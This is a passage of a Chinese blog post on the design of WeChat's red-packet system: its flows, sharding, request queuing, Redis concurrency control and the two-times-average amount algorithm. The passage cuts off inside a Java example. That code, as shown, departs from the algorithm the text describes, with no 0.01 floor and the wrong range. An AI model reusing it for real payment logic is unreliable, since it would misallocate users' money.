title=\"红包系统功能分析\"></a>红包系统功能分析</h2><p>接下来，40岁老架构带大家，从架构师视角开始红包系统的功能分析。</p>\n<p>微信红包和微信支付之间的交互，与普通商家与微信支付的交互一样，需要经过多个步骤。</p>\n<ul>\n<li><p>用户发红包时，进入微信红包下一笔订单，系统记录发红包用户、发红包金额、红包数量和要发送到的用微信群。</p>\n</li>\n<li><p>然后微信红包系统请求微信支付服务器进行下单，用户使用微信支付进行支付。</p>\n</li>\n<li><p>支付成功后，微信支付后台系统通知微信红包后台系统支付成功结果，微信红包后台系统收到通知后推送微信红包消息到微信群。</p>\n</li>\n<li><p>微信群里用户便可抢红包。</p>\n</li>\n<li><p>用户发现红包还有剩余，就可以拆剩下的红包</p>\n</li>\n</ul>\n<p>这就是微信红包和微信支付的关系以及交互过程。</p>\n<h3 id=\"功能1：包红包\"><a href=\"#功能1：包红包\" class=\"headerlink\" title=\"功能1：包红包\"></a>功能1：包红包</h3><p>系统给每个红包分配一个唯一ID，也就是发红包的订单号，然后将红包发送给用户，红包的个数，红包金额写入到存储。</p>\n<h3 id=\"功能2：发红包\"><a href=\"#功能2：发红包\" class=\"headerlink\" title=\"功能2：发红包\"></a>功能2：发红包</h3><p>用户使用微信支付完成付款，微信红包后台收到微信支付成功的通知。红包系统将红包发送订单状态更新，更新为用户已支付，并写入用户发红包记录表，这样用户可以在钱包中找到用户的发红包流水和收发红包的记录，之后微信红包系统调用微信通知，将微信红包信息发送到微信群。</p>\n<h3 id=\"功能3：抢红包\"><a href=\"#功能3：抢红包\" class=\"headerlink\" title=\"功能3：抢红包\"></a>功能3：抢红包</h3><p>微信群中的用户收到红包消息之后，点开红包，开始抢红包，这个过程微信红包系统会检查红包是否已经被抢完，是否已经过期，是否已经抢过等验证逻辑。</p>\n<h3 id=\"功能4：拆红包\"><a href=\"#功能4：拆红包\" class=\"headerlink\" title=\"功能4：拆红包\"></a>功能4：拆红包</h3><p>拆红包是整个发红包流程最复杂的一个操作，需要查询这个红包的红包订单，判断用户是否可以拆包，计算本次可拆到的红包金额，并记录抢红包流水。</p>\n<p>拆红包包括如下步骤：</p>\n<ul>\n<li><p>1）查询这个红包发送订单，判断用户是否可拆，然后计算本次可拆到的红包金额；</p>\n</li>\n<li><p>2）然后写入一条抢红包记录。如果把拆红包过程，类比为一个秒杀活动的过程，相当于扣库存与写入秒杀记录的过程；</p>\n</li>\n<li><p>3）更新库存对应于更新红包发送订单，写入秒杀记录对应于写入这个红包的领取红包记录；</p>\n</li>\n<li><p>4）另外，还要写入用户整体的红包领取记录；</p>\n</li>\n<li><p>5）最后请求微信支付系统给拆到红包用户转入零钱，成功后更新抢红包的订单状态为已转账成功。</p>\n</li>\n</ul>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/5.png\"></p>\n<p>拆红包过程类似于一个秒杀活动的过程，需要做好库存扣减和秒杀记录的操作。</p>\n<p>更新库存就是更新红包发送的订单，写入秒杀记录就是写入红包领取的信息流水。</p>\n<p>还需要以用户为中心记录用户整体的红包领取记录。</p>\n<p>最后调用支付系统将拆红包后的金额转入用户零钱中，成功之后更新抢红包的订单状态为转账成功。</p>\n<blockquote>\n<p>所以，在看此文之前，最好看看的高并发三部曲的Java高并发核心编程卷3*（注意是最新的清华大学出版社出版的加强版），里边有秒杀架构，可以作为知识铺垫。</p>\n</blockquote>\n<h4 id=\"微信红包的业务特点-1\"><a href=\"#微信红包的业务特点-1\" class=\"headerlink\" title=\"微信红包的业务特点\"></a>微信红包的业务特点</h4><p>微信红包，特别是群红包，业务形态上类似于普通商品的”秒杀”活动。</p>\n<ul>\n<li><p>包红包类似秒杀商品管理</p>\n</li>\n<li><p>发红包类似“秒杀”活动的商品上架；</p>\n</li>\n<li><p>抢红包等同于“秒杀”活动中的查询库存；</p>\n</li>\n<li><p>拆红包对应“秒杀”活动中用户的“秒杀”动作。</p>\n<p>微信红包在业务形态上和普通商品”秒杀”活动相比，还有自身特点：</p>\n</li>\n</ul>\n<ol>\n<li><p><strong>海量并发请求</strong>：微信红包用户在微信群发一个红包，等同于在网上发布一次商品”秒杀”活动，假设同时有10万个群的用户同时发红包，那就相当于同一时间有10万个”秒杀”活动发布。10万个微信群的用户同时抢红包，将产生海量并发请求。</p>\n</li>\n<li><p><strong>更严格的安全级别</strong>：微信红包业务本质上是资金交易，微信红包是微信支付的一个商户，提供资金流转服务，用户发红包相当于在微信红包这个商户上使用微信支付购买了一笔”钱”，且收货地址是微信群。当用户支付成功后，红包”发货”到微信群里，群里的用户拆开红包后，微信红包提供了将”钱”转入拆红包用户微信零钱的服务。</p>\n</li>\n<li><p><strong>订单层南北独立体系</strong>：微信红包系统采用南北独立体系的订单层设计，即数据在南北两个系统中不同步。用户就近接入系统，请求发红包时，系统会根据用户所在地分配订单到南或北的系统，并在订单号上打上南北标识。这种设计有助于分摊流量，降低系统风险。</p>\n</li>\n<li><p><strong>流量闭环</strong>：在抢红包、拆红包、查红包详情列表时，接入层会根据红包单号上的南北标识，将流量分别引导到对应的南北系统闭环。这意味着，无论是发红包还是抢红包，用户都能够在就近的系统中完成操作，无需跨城，提高了系统的响应速度和稳定性。</p>\n</li>\n<li><p><strong>用户数据处理</strong>：微信红包系统的用户数据采取写多读少、全量保存的策略。用户数据的查询入口在微信钱包中，相对隐藏，访问量不会太大，且被视为可旁路的非关键信息，实时性要求不高。这种设计方式可以减少数据存储的压力，提高系统性能。</p>\n</li>\n<li><p><strong>实时计算红包金额</strong>：</p>\n<p>微信红包的金额是在拆红包时实时计算的，而不是预先分配的。系统会在拆红包时取0.01到剩余平均值*2之间的数值作为红包金额。</p>\n<p>这种实时计算的方式基于内存进行，不需要额外的存储空间，且计算效率很高。</p>\n<p>同时，为了保证操作的原子性，拆包过程中使用了CAS（Compare-and-Swap）算法，确保每次只有一个并发用户拆包成功。如果拆包CAS失败，系统会自动进行重试，但也可能在重试过程中被其他用户抢得先机而空手而归。</p>\n</li>\n<li><p><strong>架构演进</strong>：随着微信红包功能的不断发展和用户量的增长，其系统架构也经历了不断的演进和优化。从最初的数据库硬抗整个流量，到后来的使用缓存（cache）抗流量，再到现在的南北独立体系等设计，都是为了更好地应对高并发、提升系统性能和稳定性。</p>\n<p>资金交易业务比普通商品”秒杀”有更高的安全级别要求，普通的商品”秒杀”由商户提供，库存是商户预设，”秒杀”允许存在超卖和少卖的情况，但对于微信红包，用户发100元的红包绝对不可以拆出101元，以及只被领取99元时，剩下的1元在24小时过期后要精准退还给发红包用户。</p>\n<p>总的来说，微信红包系统架构的设计充分考虑了用户量、并发量、性能要求等因素，通过南北独立体系、流量闭环、用户数据处理、实时计算红包金额以及架构演进等多种手段，保证了系统的稳定运行和良好用户体验。</p>\n</li>\n</ol>\n<h4 id=\"微信红包的技术难点-1\"><a href=\"#微信红包的技术难点-1\" class=\"headerlink\" title=\"微信红包的技术难点\"></a>微信红包的技术难点</h4><p>微信红包系统架构的技术难点主要体现在以下几个方面：</p>\n<ol>\n<li><p><strong>高并发难点</strong>：</p>\n<p>微信红包在特定时间（如春节、节假日等）会面临极高的并发量，如何有效地处理这些并发请求，保证系统的稳定性和响应速度，是红包系统架构设计的关键挑战之一。</p>\n</li>\n<li><p><strong>资金安全难点</strong>：</p>\n<p>红包系统涉及到资金的转移和存储，因此资金安全是系统设计的重中之重。如何确保资金安全，防止被攻击或篡改，是系统架构设计中需要重点考虑的问题。</p>\n<p>红包业务涉及资金交易，所以一定不能出现超卖、少卖的情况。</p>\n</li>\n</ol>\n<ul>\n<li><p>超卖：发了 10 块钱，结果抢到了 11 块钱，多的钱只能系统补上，如此为爱发电应用估计早就下架了；</p>\n</li>\n<li><p>少卖：发了 10 块钱，只抢了 9 块，多的钱得原封不动地退还用户，否则第二天就接到法院传单了。</p>\n</li>\n</ul>\n<ol start=\"4\">\n<li><p><strong>用户体验难点</strong></p>\n<p>红包系统需要保证良好的用户体验，包括响应速度、公平性（先抢先得）、成功率等。</p>\n<p>如何在高并发场景下保证用户体验，是系统架构设计的重要目标。</p>\n<p>了解下微信红包的用户体验 的4大核心：摇&#x2F;发&#x2F;抢&#x2F;拆。</p>\n</li>\n</ol>\n<ul>\n<li><p>摇：摇的流畅</p>\n</li>\n<li><p>快：抢的要快</p>\n</li>\n<li><p>爽：拆的爽</p>\n</li>\n<li><p>稳：能分享出去</p>\n</li>\n</ul>\n<ol start=\"6\">\n<li><p><strong>数据一致性难点</strong>：</p>\n<p>红包系统需要保证数据的一致性，包括红包库存数据、用户账户数据等。如何在高并发场景下保证数据的一致性，是系统架构设计的重要挑战。</p>\n</li>\n</ol>\n<ul>\n<li><p>参与用户越多，并发 DB 请求越大，数据越容易出现事务问题，所以系统得做好<strong>事务一致性</strong>；</p>\n</li>\n<li><p>抢红包系统涉及金钱交易，所以事务级别要求更高，<strong>不能出现脏数据</strong>。</p>\n</li>\n</ul>\n<ol start=\"8\">\n<li><p><strong>系统扩展性难点</strong>：</p>\n<p>随着用户量和业务量的增长，红包系统需要具备良好的扩展性，能够方便地增加新的功能或提升性能。</p>\n<p>如何设计可扩展的系统架构，是系统架构设计的重要考虑因素。</p>\n<p>为了解决这些技术难点，我们可以采用多种技术手段，如分而治之、负载均衡、读写分离、水平切分、垂直切分等，来提升系统的性能和稳定性。同时，系统还采用了柔性服务、系统降级等策略，来保证在有限资源下满足用户的核心需求。</p>\n</li>\n</ol>\n<h3 id=\"红包系统概要设计\"><a href=\"#红包系统概要设计\" class=\"headerlink\" title=\"红包系统概要设计\"></a>红包系统概要设计</h3><h4 id=\"系统功能说明-1\"><a href=\"#系统功能说明-1\" class=\"headerlink\" title=\"系统功能说明\"></a>系统功能说明</h4><p>抢红包功能允许用户在群聊中发送任意个数和金额的红包，群成员可以抢到随机金额的红包，但要<strong>保证每个用户的红包金额不小于 0.01 元</strong>。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/3.png\"><br>抢红包的详细交互流程如下：</p>\n<ol>\n<li><p>用户接收到抢红包通知，点击通知打开群聊页面；</p>\n</li>\n<li><p>用户点击抢红包，后台服务验证用户资格，确保用户尚未领取过此红包；</p>\n</li>\n<li><p>若用户资格验证通过，后台服务分配红包金额并存储领取记录；</p>\n</li>\n<li><p>用户在微信群中看到领取金额，红包状态更新为“已领取”；</p>\n</li>\n<li><p>异步调用支付接口，将红包金额更新到钱包里。</p>\n</li>\n</ol>\n<h2 id=\"数据库设计\"><a href=\"#数据库设计\" class=\"headerlink\" title=\"数据库设计\"></a>数据库设计</h2><p><strong>红包表：redpack</strong></p>\n<p>红包表用来记录用户发了多少红包，以及需要维护的剩余金额，</p>\n<p>红包表：redpack的字段如下：</p>\n<table>\n<thead>\n<tr>\n<th>字段</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>id</td>\n<td>主键，红包ID。</td>\n</tr>\n<tr>\n<td>user_id</td>\n<td>发送红包的用户id。</td>\n</tr>\n<tr>\n<td>total_amount</td>\n<td>红包总金额。</td>\n</tr>\n<tr>\n<td>surplus_amount</td>\n<td>红包剩余金额。</td>\n</tr>\n<tr>\n<td>total</td>\n<td>红包总数。</td>\n</tr>\n<tr>\n<td>surplus_total</td>\n<td>剩余红包总数。</td>\n</tr>\n</tbody></table>\n<p><strong>红包记录表：redpack_record</strong></p>\n<table>\n<thead>\n<tr>\n<th>字段</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>id</td>\n<td>主键，记录id。</td>\n</tr>\n<tr>\n<td>redpack_id</td>\n<td>红包id。</td>\n</tr>\n<tr>\n<td>user_id</td>\n<td>用户id。</td>\n</tr>\n<tr>\n<td>amount</td>\n<td>抢到的金额。</td>\n</tr>\n</tbody></table>\n<h4 id=\"发红包-1\"><a href=\"#发红包-1\" class=\"headerlink\" title=\"发红包\"></a>发红包</h4><p>设置完红包参数后，微信支付，完成付款，然后收到付款成功通知，红包系统更新红包订单状态，更新为已支付，并写入红包发送记录表。</p>\n<p>这样用户可以将用户的红包信息和红包的收发记录发出，红包系统调用微信通知，将红包信息发送到微信群。</p>\n<p>发红包的交互步骤如下：</p>\n<ol>\n<li><p>用户设置红包的总金额和个数后，在红包表中增加一条数据，开始发红包；</p>\n</li>\n<li><p>为了保证实时性和抢红包的效率，在 Redis 中增加一条记录，<strong>存储红包 ID 和总人数 n</strong>；</p>\n</li>\n<li><p>抢红包消息推送给所有群成员。</p>\n</li>\n</ol>\n<h4 id=\"抢红包-1\"><a href=\"#抢红包-1\" class=\"headerlink\" title=\"抢红包\"></a>抢红包</h4><p>微信群用户收到红包后，点开，红包系统会校验红包是否被抢完，是否过期。</p>\n<p>微信红包的抢红包和拆红包是两个分离的服务，用户点击抢红包后需要进行两次操作。</p>\n<p>这也是为什么明明有时候抢到了红包，点开后却发现<strong>该红包已经被领取完了</strong>。</p>\n<p>抢红包的交互步骤如下：</p>\n<ol>\n<li><p>抢红包：抢操作在 Redis 缓存层完成，通过原子递减的操作来更新红包个数，个数递减为 0 后就说明抢光了。</p>\n</li>\n<li><p>拆红包：拆红包时，首先会实时计算金额，一般是通过二倍均值法实现（即 0.01 到剩余平均值的 2 倍之间）。</p>\n</li>\n<li><p>红包记录：用户获取红包金额后，通过数据库的事务操作累加已经领取的个数和金额，并更新红包表和记录表。</p>\n</li>\n<li><p>转账：为了提升效率，最终的转账为异步操作，这也是为什么在春节期间，红包领取后不能立即在余额中看到的原因。</p>\n</li>\n</ol>\n<h2 id=\"红包系统详细设计\"><a href=\"#红包系统详细设计\" class=\"headerlink\" title=\"红包系统详细设计\"></a>红包系统详细设计</h2><h3 id=\"红包整体架构\"><a href=\"#红包整体架构\" class=\"headerlink\" title=\"红包整体架构\"></a>红包整体架构</h3><p>如下图所示，是微信红包的系统架构</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/4.png\"><br>总体是三层架构：</p>\n<ul>\n<li><p>首先是微信统一接入层，下面是微信红包系统 API，包括发、抢、拆、查红包详情、查红包用户列表。</p>\n</li>\n<li><p>接入层下面，是封装微信红包关键业务的逻辑服务；</p>\n</li>\n<li><p>业务下面数据存储层，微信红包最主要的数据是订单数据，包括发红包订单和拆红包订单两部分。</p>\n</li>\n</ul>\n<p>数据存储层的冷热分离设计：微信红包数据的访问热度，随着时间流逝会急剧降低，也就是数据的访问时间段非常集中，一般红包发出三天后，99% 的用户不会再去点开这个红包了。因此微信红包系统采取按时间做冷热数据分离，降低数据的存储成本，同时提升了热数据的访问性能。</p>\n<p>除了在线计算的三层架构，还有离线处理的数据分析。</p>\n<p>数据分析平台用于对红包数据的分析计算，比如朋友圈里的文章，统计从 某年 1 月 1 日到 2017 年 1 月一个用户总共抢红包的金额，在全国的排名情况，发红包数最多的城市等。</p>\n<p>数据分析平台另外一个作用就是对账，红包的订单和微信支付的订单需要对账，以保证最终资金的一致性；</p>\n<ul>\n<li><p>订单的数据和订单的 cache 需要做对账，以保证数据的完整性；</p>\n</li>\n<li><p>订单数据和用户的收发记录需要对账，以保证用户列表完整性。</p>\n</li>\n</ul>\n<h3 id=\"高并发常用解决方案\"><a href=\"#高并发常用解决方案\" class=\"headerlink\" title=\"高并发常用解决方案\"></a>高并发常用解决方案</h3><p>普通商品秒杀系统，解决高并发问题的方案，大致有以下2种：</p>\n<h3 id=\"1-使用内存替代实时的DB\"><a href=\"#1-使用内存替代实时的DB\" class=\"headerlink\" title=\"1- 使用内存替代实时的DB\"></a>1- 使用内存替代实时的DB</h3><p>将实时扣库存的行为上移到内存Cache中，内存Cache操作成功直接给Server返回成功，然后异步落DB持久化。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/8.png\"><br>这个方案的优缺点如下：</p>\n<blockquote>\n<p>优点：用内存操作替代磁盘操作，提高了并发性能。</p>\n<p>缺点：在内存操作成功DB持久化失败，或者内存Cache故障的情况下，DB持久化会丢数据，不适合微信红包这种资金交易系统。</p>\n</blockquote>\n<h3 id=\"2-使用乐观锁替代悲观锁\"><a href=\"#2-使用乐观锁替代悲观锁\" class=\"headerlink\" title=\"2- 使用乐观锁替代悲观锁\"></a>2- 使用乐观锁替代悲观锁</h3><p><strong>什么是悲观锁呢？</strong></p>\n<p>所谓悲观锁，是关系数据库管理系统里的一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作对某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。对应于上文分析中的“并发请求抢锁”行为。</p>\n<p><strong>什么是乐观锁呢？</strong></p>\n<p>所谓乐观锁，它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。</p>\n<p>乐观锁分为DB乐观锁和 JVM CAS 乐观锁。</p>\n<p>DB乐观锁的具体应用方法，是在 DB 的“库存”记录中维护一个版本号。</p>\n<p>商品“秒杀”系统中，在更新“库存”的操作进行前，先去 DB 获取当前版本号。</p>\n<p>在更新库存的事务提交时，检查该版本号是否已被其他事务修改。如果版本没被修改，则提交事务，且版本号加 1；如果版本号已经被其他事务修改，则回滚事务，并给上层报错。</p>\n<p>DB乐观锁可以提高DB的并发处理能力，但是如果应用于微信红包系统，则会存在下面三个问题：</p>\n<ol>\n<li><p>如果拆红包采用乐观锁，那么在并发抢到相同版本号的拆红包请求中，只有一个能拆红包成功，其他的请求将事务回滚并返回失败，给用户报错，用户体验完全不可接受。</p>\n</li>\n<li><p>如果采用乐观锁，将会导致第一时间同时拆红包的用户有一部分直接返回失败，反而那些“手慢”的用户，有可能因为并发减小后拆红包成功，这会带来用户体验上的负面影响。</p>\n</li>\n<li><p>如果采用乐观锁的方式，会带来大数量的无效更新请求、事务回滚，给 DB 造成不必要的额外压力。</p>\n</li>\n</ol>\n<h4 id=\"JVM-CAS-乐观锁方案-1\"><a href=\"#JVM-CAS-乐观锁方案-1\" class=\"headerlink\" title=\"JVM CAS 乐观锁方案\"></a>JVM CAS 乐观锁方案</h4><p>出于性能原因，微信红包系统使用 JVM CAS 乐观锁，而不是DB乐观锁的方式解决并发抢锁问题。</p>\n<p>微信红包的金额是在拆红包时实时计算的，而不是预先分配的。系统会在拆红包时取0.01到剩余平均值*2之间的数值作为红包金额。</p>\n<p>这种实时计算的方式基于JVM 内存进行，不需要额外的存储空间，且计算效率很高。</p>\n<p>同时，为了保证操作的原子性，拆包过程中使用了CAS（Compare-and-Swap）算法，确保每次只有一个并发用户拆包成功。如果拆包CAS失败，系统会自动进行重试，但也可能在重试过程中被其他用户抢得先机而空手而归。</p>\n<p>如何保证同一个红包由同一个节点去拆包呢？将同一个红包 ID 的所有请求 stick 到同一台 Server，这个后面介绍。</p>\n<blockquote>\n<p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h2 id=\"微信红包系统的高并发解决方案\"><a href=\"#微信红包系统的高并发解决方案\" class=\"headerlink\" title=\"微信红包系统的高并发解决方案\"></a>微信红包系统的高并发解决方案</h2><p>综合上面的分析，我们的红包系统针对相应的技术难点，采用如下3个方案，解决高并发问题。</p>\n<h5 id=\"1-分而治之：系统架构设计垂直Set化。-1\"><a href=\"#1-分而治之：系统架构设计垂直Set化。-1\" class=\"headerlink\" title=\"1- 分而治之：系统架构设计垂直Set化。\"></a>1- 分而治之：系统架构设计垂直Set化。</h5><p><strong>什么是Set（单元）化架构呢?</strong></p>\n<blockquote>\n<p>单元化架构是一种将系统划分为多个独立的、自包含的单元的部署架构，每个单元都能够完成所有业务操作，包含所有业务所需的服务以及分配给该单元的数据。这种架构将单元作为部署的基本单位，在全站所有机房中部署多个单元，每个机房内的单元数目不固定，但任一单元均部署系统所需的全部应用。数据则是全量数据按照某种维度划分后的一部分。与传统意义上的SOA（服务化）架构不同，单元化架构下，服务仍然是分层的，但每一层中的任意一个节点都属于且仅属于某一个单元，上层调用下层时，仅会选择本单元内的节点。</p>\n</blockquote>\n<p><strong>通俗的理解为</strong>：</p>\n<p>单元化架构，简单来说，就是把系统拆分成若干个独立的单元，每个单元都包含了完成业务操作所需的所有服务和数据。这些单元可以独立部署、管理和监控，就像一个个小房子，每个房子都有自己的客厅、卧室和厨房（服务），也有自己的食物和水（数据）。</p>\n<p>如下图，是一种单元化架构设计。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/6.png\"></p>\n<p>微信红包用户发一个红包时，微信红包系统生成一个 ID 作为这个红包的唯一标识。</p>\n<p>接下来这个红包的所有发红包、抢红包、拆红包、查询红包详情等操作，都根据这个 ID 关联。</p>\n<p>红包系统根据这个红包 ID，按一定的规则（如按 ID 尾号取模等），垂直上下切分。</p>\n<p>切分后，一个垂直链条上的逻辑 Server 服务器、DB 统称为一个 SET。</p>\n<p>各个 SET 之间相互独立，互相解耦。并且同一个红包 ID 的所有请求，包括发红包、抢红包、拆红包、查详情详情等，垂直 stick 到同一个 SET 内处理，高度内聚。</p>\n<p>通过这样的方式，系统将所有红包请求这个巨大的洪流分散为多股小流，互不影响，分而治之，如下图所示。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/7.png\"><br>这个方案解决了同时存在海量事务级操作的问题，将<strong>海量化为小量</strong>。</p>\n<h5 id=\"2-解决DB并发：逻辑Server层将请求排队。-1\"><a href=\"#2-解决DB并发：逻辑Server层将请求排队。-1\" class=\"headerlink\" title=\"2- 解决DB并发：逻辑Server层将请求排队。\"></a>2- 解决DB并发：逻辑Server层将请求排队。</h5><p>红包系统是资金交易系统，DB 操作的事务性无法避免，所以会存在“并发抢锁”问题。但是如果到达 DB 的事务操作（也即拆红包行为）不是并发的，而是串行的，就不会存在“并发抢锁”的问题了。</p>\n<p>按这个思路，为了使拆红包的事务操作串行地进入 DB，只需要将请求在 Server 层以 FIFO（先进先出）的方式排队，就可以达到这个效果。从而问题就集中到 Server 的 FIFO 队列设计上。</p>\n<p>红包系统设计了分布式的、轻巧的、灵活的 FIFO 队列方案。其具体实现如下：</p>\n<p><strong>1）将同一个红包 ID 的所有请求 stick 到同一台 Server。</strong></p>\n<p>上面 SET 化方案已经介绍，同个红包 ID 的所有请求，按红包 ID stick 到同个 SET 中。</p>\n<p>不过在同个 SET 中，会存在多台 Server 服务器同时连接同一台 DB（基于容灾、性能考虑，需要多台 Server 互备、均衡压力）。</p>\n<p>为了使同一个红包 ID 的所有请求，stick 到同一台 Server 服务器上，在 SET 化的设计之外，微信红包系统添加了一层基于红包 ID hash 值的分流，如下图所示。</p>\n<blockquote>\n<p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<p><strong>2）设计单机请求排队方案。</strong></p>\n<p>将 stick 到同一台 Server 上的所有请求在被接收进程接收后，按红包 ID 进行排队。</p>\n<p>然后串行地进入 worker 进程（执行业务逻辑）进行处理，从而达到排队的效果，如下图所示。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/9.png\"><br><strong>3）增加 Redis缓存 控制并发。</strong></p>\n<p>为了防止 Server 中的请求队列过载导致队列被降级，从而所有请求拥进 DB，系统增加了与 Server 服务器同机部署的 Redis ，用于控制拆同一个红包的请求并发数。</p>\n<p>具体来说，利用 Redis 的 CAS 原子累增操作，控制同时进入 DB 执行拆红包事务的请求数，超过预先设定数值则直接拒绝服务。用于 DB 负载升高时的降级体验。</p>\n<p>通过以上三个措施，系统有效地控制了 DB 的“并发抢锁”情况。</p>\n<h5 id=\"3-系统性能稳定性保障：双维度分库分表设计。-1\"><a href=\"#3-系统性能稳定性保障：双维度分库分表设计。-1\" class=\"headerlink\" title=\"3- 系统性能稳定性保障：双维度分库分表设计。\"></a>3- 系统性能稳定性保障：双维度分库分表设计。</h5><p>红包系统的分库表规则，初期是根据红包 ID 的 hash 值分为多库多表。</p>\n<p>随着红包数据量逐渐增大，单表数据量也逐渐增加。而 DB 的性能与单表数据量有一定相关性。当单表数据量达到一定程度时，DB 性能会有大幅度下降，影响系统性能稳定性。</p>\n<p>采用冷热分离，将历史冷数据与当前热数据分开存储，可以解决这个问题。</p>\n<p>处理微信红包数据的冷热分离时，系统在以红包 ID 维度分库表的基础上，增加了以循环天分表的维度，形成了双维度分库表的特色。</p>\n<p>具体来说，就是分库表规则像 db_xx.t_y_dd 设计，其中，xx&#x2F;y 是红包 ID 的 hash 值后三位，dd 的取值范围在 01~31，代表一个月天数最多 31 天。</p>\n<p>通过这种双维度分库表方式，解决了 DB 单表数据量膨胀导致性能下降的问题，保障了系统性能的稳定性。同时，在热冷分离的问题上，又使得数据搬迁变得简单而优雅。</p>\n<p>综上所述，微信红包系统在解决高并发问题上的设计，主要采用了 <strong>SET 化分治</strong>、<strong>请求排队</strong>、<strong>双维度分库表</strong>等方案，使得单组 DB 的并发性能大幅度提升，取得了很好的效果。</p>\n<h4 id=\"红包分配算法-1\"><a href=\"#红包分配算法-1\" class=\"headerlink\" title=\"红包分配算法\"></a>红包分配算法</h4><p>抢红包后，我们需要进行拆红包，接下来我们讨论一下红包系统的红包分配算法。</p>\n<p>红包金额分配时，由于是随机分配，所以有两种实现方案：<strong>实时拆分和预先生成</strong></p>\n<h5 id=\"1-实时拆分-1\"><a href=\"#1-实时拆分-1\" class=\"headerlink\" title=\"1- 实时拆分\"></a>1- 实时拆分</h5><p>实时拆分，指的是在<strong>抢红包时实时计算</strong>每个红包的金额，以实现红包的拆分过程。</p>\n<p>这个对系统性能和拆分算法要求较高，例如拆分过程要一直保证后续待拆分红包的金额不能为空，不容易做到拆分的红包金额服从<strong>正态分布</strong>规律。</p>\n<h5 id=\"2-预先生成-1\"><a href=\"#2-预先生成-1\" class=\"headerlink\" title=\"2- 预先生成\"></a>2- 预先生成</h5><p>预先生成，指的是在红包<strong>开抢之前</strong>已经完成了红包的<strong>金额拆分</strong>，抢红包时只是依次取出拆分好的红包金额。</p>\n<p>这种方式对拆分算法要求较低，可以拆分出随机性很好的红包金额，但通常需要结合队列使用。</p>\n<h5 id=\"3-二倍均值法-1\"><a href=\"#3-二倍均值法-1\" class=\"headerlink\" title=\"3- 二倍均值法\"></a>3- 二倍均值法</h5><p>综合上述优缺点考虑，以及微信群聊中的人数不多（目前最高 500 人），所以我们采用实时拆分的方式，用<strong>二倍均值法</strong>来生成随机红包，只满足随机即可，不需要正态分布。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">使用二倍均值法生成的随机数，每次随机金额会在  0.01 ~ 剩余平均值\\*2 之间。  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>假设当前红包剩余金额为 10 元，剩余个数为 5，<strong>10&#x2F;5 &#x3D; 2</strong>，则当前用户可以抢到的红包金额为：<strong>0.01 ~ 4</strong> 元之间。</p>\n<p>以下是使用Java实现的二倍均值算法，在红包分配场景中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public class RedPacketDistribution &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public static List&lt;BigDecimal&gt; distribute(BigDecimal totalAmount, int totalCount) &#123;  </span><br><span class=\"line\">        // 校验总金额是否为正  </span><br><span class=\"line\">        if (totalAmount.compareTo(BigDecimal.ZERO) &lt;= 0) &#123;  </span><br><span class=\"line\">            throw new IllegalArgumentException(&quot;Invalid parameter, totalAmount must be positive.&quot;);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        // 校验红包总数是否至少为1  </span><br><span class=\"line\">        if (totalCount &lt; 1) &#123;  </span><br><span class=\"line\">            throw new IllegalArgumentException(&quot;Invalid parameter, totalCount must be at least 1.&quot;);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        List&lt;BigDecimal&gt; redPacketList = new ArrayList&lt;&gt;(totalCount);  </span><br><span class=\"line\">        BigDecimal remainingAmount = totalAmount.multiply(BigDecimal.valueOf(2)); // 初始化为总金额的两倍  </span><br><span class=\"line\">        ThreadLocalRandom random = ThreadLocalRandom.current(); // 使用线程安全的随机数生成器  </span><br><span class=\"line\">  </span><br><span class=\"line\">        for (int i = 0; i &lt; totalCount - 1; i++) &#123;  </span><br><span class=\"line\">            // 随机获取一个幸运值，范围在\\[0, 当前剩余金额)  </span><br><span class=\"line\">            BigDecimal luckValue = BigDecimal.valueOf(random.nextDouble()).multiply(remainingAmount);  </span><br><span class=\"line\">            // 计算并添加实际分配的红包金额（幸运值的一半）  </span><br><span class=\"line\">            BigDecimal amount = luckValue.divide(BigDecimal.valueOf(2), BigDecimal.ROUND\\_HALF\\_DOWN);  </span><br><span class=\"line\">            redPacketList.add(amount);  </span><br><span class=\"line\">            // 更新剩余金额  </span><br><span class=\"line\">            remainingAmount = 